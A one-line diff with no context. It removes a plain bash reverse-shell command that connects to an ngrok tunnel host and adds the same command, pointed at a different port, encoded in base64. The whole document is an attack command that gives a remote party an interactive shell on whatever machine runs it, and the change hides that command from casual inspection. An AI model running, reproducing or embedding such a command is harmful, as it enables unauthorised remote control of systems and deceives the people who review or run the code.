@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/14952 0>&1
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMC50Y3AuanAubmdyb2suaW8vMTI5NTcgMD4mMSAK
